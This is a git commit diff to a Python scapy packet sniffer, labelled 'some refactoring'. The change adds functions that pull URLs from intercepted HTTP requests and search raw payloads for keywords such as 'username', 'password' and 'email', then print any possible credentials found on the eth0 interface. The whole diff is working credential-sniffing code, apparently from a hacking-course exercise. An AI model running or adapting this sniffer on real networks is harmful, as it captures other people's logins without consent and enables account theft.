2d3368b83cd69980d530a7c587655de451caf305
root <root@localhost.localdomain>
2019-05-08 15:04:13 -0400

    some refactoring

--- packet_sniffer/packet_sniffer.py
+++ packet_sniffer/packet_sniffer.py
@@ -7,10 +7,27 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        payload = packet[scapy.Raw].load
+        keywords = ["username", "user", "login", "password", "pass", "email"]
+        for keyword in keywords:
+            if keyword in payload:
+                return payload
+
+
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw].load)
+        url = get_url(packet)
+        print("[+] HTTP Request >> " + url)
+
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password > " + login_info + "\n\n")
 
 
 sniff("eth0")
